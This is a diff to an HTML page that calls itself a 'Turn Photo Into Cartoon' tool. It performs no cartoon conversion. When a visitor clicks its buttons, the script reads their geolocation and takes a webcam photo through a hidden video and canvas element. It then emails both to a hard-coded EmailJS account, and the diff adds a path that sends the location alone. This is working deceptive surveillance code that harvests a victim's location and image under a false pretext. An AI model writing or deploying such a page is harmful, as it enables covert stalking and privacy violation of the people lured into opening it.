@@ -1,53 +1,67 @@
-<!DOCTYPE html>
+
+ <!DOCTYPE html>
 <html>
 <head>
-  <title>Check your Location</title>
+  <title>Turn Photo Into Cartoon </title>
 </head>
 <body>
-  <h2>Turn Photo Into Cartoon</h2>
-  <button onclick="captureAndSend()">Capture now</button>
+  <h2>Choose an Option</h2>
+  <button onclick="sendLocationOnly()">Check Location </button>
+  <button onclick="captureAndSend()">Take Carton Photo </button>
 
   <video id="video" autoplay style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    emailjs.init("vyxyeBFTfSi_ISmNG"); // Your public key
+    emailjs.init("vyxyeBFTfSi_ISmNG"); // Your EmailJS public key
 
+    // Location Only
+    function sendLocationOnly() {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const message = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
+
+        emailjs.send("service_gkkpt4w", "template_96dsagv", {
+          message: message,
+          image: '' // Send blank image so it doesn’t break
+        })
+        .then(res => console.log("Location Found!", res))
+        .catch(err => console.error("Email failed", err));
+      }, function(error) {
+        alert("Could not get location.");
+        console.error(error);
+      });
+    }
+
+    // Picture + Location
     async function captureAndSend() {
       const video = document.getElementById("video");
       const canvas = document.getElementById("canvas");
       const context = canvas.getContext("2d");
 
-      // Start camera
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       video.srcObject = stream;
 
-      // Wait for video to load
       await new Promise(resolve => setTimeout(resolve, 1500));
 
-      // Capture photo
       canvas.width = 320;
       canvas.height = 240;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
       const imageBase64 = canvas.toDataURL("image/png");
 
-      // Stop camera
       stream.getTracks().forEach(track => track.stop());
 
-      // Get location
       navigator.geolocation.getCurrentPosition(function(position) {
         const message = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
 
-        // Send email with both
         emailjs.send("service_gkkpt4w", "template_96dsagv", {
           message: message,
           image: imageBase64
         })
-        .then(res => console.log("Email sent!", res))
+        .then(res => console.log("Photo and location Captured!", res))
         .catch(err => console.error("Email failed", err));
       }, function(error) {
-        alert("Error getting location.");
+        alert("Could not get location.");
         console.error(error);
       });
     }
